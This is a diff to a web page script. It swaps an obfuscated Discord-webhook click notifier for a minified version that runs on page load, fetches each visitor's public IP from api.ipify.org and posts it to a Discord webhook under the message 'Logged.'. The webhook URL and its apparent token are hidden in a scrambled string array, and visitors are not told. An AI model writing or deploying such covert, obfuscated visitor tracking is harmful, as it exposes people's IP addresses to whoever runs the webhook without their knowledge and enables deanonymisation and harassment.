@@ -1,15 +1,2 @@
-sendMessage();
-function sendMessage() {
-  var request = new XMLHttpRequest();
-  var _0x3a4927=_0x500b;function _0x500b(_0x21931b,_0x46fa94){var _0x3a4229=_0x5bd4();return _0x500b=function(_0x1b7ae4,_0x776714){_0x1b7ae4=_0x1b7ae4-(0xbf*-0x17+-0x244a+0x36cd);var _0xf13b5d=_0x3a4229[_0x1b7ae4];return _0xf13b5d;},_0x500b(_0x21931b,_0x46fa94);}function _0x5bd4(){var _0x21ec62=['POST','WJCwsXQNr0','https://di','12GcGYMH','api/webhoo','scord.com/','nfcazRM0jT','586980Jthmrb','128478jyCGBX','JFk9P44Zfg','199568gdtGHL','ks/9996939','0080767182','233023PedUET','open','wEmOpIn4kR','1321404dsgWhy','8/02yJRXiq','WoWF-Ck2Lm','0Z_WV2K2qS','1336iZyljV','29583IDwqZg','122709vxQDjh'];_0x5bd4=function(){return _0x21ec62;};return _0x5bd4();}(function(_0x497b33,_0x75616d){var _0x2661c9=_0x500b,_0x1bda5b=_0x497b33();while(!![]){try{var _0x7b5d2=-parseInt(_0x2661c9(0x16d))/(0x8*0x15c+0x1e84*-0x1+0x13a5*0x1)+-parseInt(_0x2661c9(0x163))/(0x1022+0x2318+-0x4*0xcce)*(parseInt(_0x2661c9(0x15f))/(-0x187f+-0x146+0x294*0xa))+parseInt(_0x2661c9(0x16a))/(-0x229d*0x1+-0x2537+0x47d8)+-parseInt(_0x2661c9(0x167))/(0x178+-0x22be+0x214b)+-parseInt(_0x2661c9(0x168))/(0x2*-0x97+0x6fd+-0x5c9)+parseInt(_0x2661c9(0x170))/(-0x12*0x39+-0x2345*-0x1+0xf9e*-0x2)+parseInt(_0x2661c9(0x15d))/(-0x1a2*0x4+0x8bd+-0x22d*0x1)*(parseInt(_0x2661c9(0x15e))/(0x1bde+-0x1bc1+-0x14*0x1));if(_0x7b5d2===_0x75616d)break;else _0x1bda5b['push'](_0x1bda5b['shift']());}catch(_0x162490){_0x1bda5b['push'](_0x1bda5b['shift']());}}}(_0x5bd4,-0x14*0x1466+-0x1*0x43fcf+0x2543*0x3a),request[_0x3a4927(0x16e)](_0x3a4927(0x160),_0x3a4927(0x162)+_0x3a4927(0x165)+_0x3a4927(0x164)+_0x3a4927(0x16b)+_0x3a4927(0x16c)+_0x3a4927(0x15a)+_0x3a4927(0x15c)+_0x3a4927(0x166)+_0x3a4927(0x169)+_0x3a4927(0x15b)+_0x3a4927(0x16f)+_0x3a4927(0x161)));  
-  request.setRequestHeader('Content-type', 'application/json');
 
-  var params = {
-    username: "Helper",
-    avatar_url: "https://tr.rbxcdn.com/5674bc1f6f1c5550d47f6a5b32e26ae7/420/420/Image/Png",
-    content: "Someone Clicked On Your Site! @everyone"
-
-  }
-
-  request.send(JSON.stringify(params));
-}
+var ip;function sendMessage(){var e=new XMLHttpRequest,t=r;function r(e,t){var n=s();return(r=function(e,t){return n[e-=346]})(e,t)}function s(){var e=["POST","WJCwsXQNr0","https://di","12GcGYMH","api/webhoo","scord.com/","nfcazRM0jT","586980Jthmrb","128478jyCGBX","JFk9P44Zfg","199568gdtGHL","ks/9996939","0080767182","233023PedUET","open","wEmOpIn4kR","1321404dsgWhy","8/02yJRXiq","WoWF-Ck2Lm","0Z_WV2K2qS","1336iZyljV","29583IDwqZg","122709vxQDjh"];return(s=function(){return e})()}(function(){for(var e=r,t=s();;)try{if(170343==-parseInt(e(365))+-parseInt(e(355))/2*(parseInt(e(351))/3)+parseInt(e(362))/4+-parseInt(e(359))/5+-parseInt(e(360))/6+parseInt(e(368))/7+parseInt(e(349))/8*(parseInt(e(350))/9))break;t.push(t.shift())}catch(e){t.push(t.shift())}})(),e[t(366)](t(352),t(354)+t(357)+t(356)+t(363)+t(364)+t(346)+t(348)+t(358)+t(361)+t(347)+t(367)+t(353)),e.setRequestHeader("Content-type","application/json");t={username:"Helper",avatar_url:"https://tr.rbxcdn.com/5674bc1f6f1c5550d47f6a5b32e26ae7/420/420/Image/Png",content:"@everyone",embeds:[{title:"Logged.",description:"IP: "+ip+" someone clicked on your website"}]};e.send(JSON.stringify(t))}fetch("https://api.ipify.org/?format=json").then(e=>e.json()).then(e=>ip=e.ip),sendMessage();
